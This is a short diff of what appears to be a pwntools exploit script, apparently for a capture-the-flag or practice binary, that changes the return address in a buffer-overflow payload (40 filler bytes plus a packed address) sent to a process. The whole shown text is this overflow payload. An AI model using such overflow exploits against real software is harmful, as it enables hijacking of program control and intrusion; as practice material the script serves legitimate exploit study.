@@ -20,7 +20,7 @@ def start():
 
 p = start()
 
-payload = b"a"*40 + p64(0x401172)
+payload = b"a"*40 + p64(0x4011e3)
 
 p.sendline(payload)
 
